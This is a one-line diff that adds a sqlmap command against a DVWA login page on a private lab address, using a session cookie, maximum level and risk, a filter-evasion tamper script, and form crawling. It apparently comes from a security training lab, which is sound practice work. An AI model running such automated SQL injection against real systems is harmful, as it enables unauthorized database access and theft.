@@ -1,0 +1,1 @@
+sudo sqlmap -u "http://192.168.50.101/dvwa/login.php" --data="username=admin&password=admin" --cookie="PHPSESSID=9b120e39246...eaac9e9d3a; security=high" --level=5 --risk=3 --random-agent --tamper=space2comment --forms --crawl=2
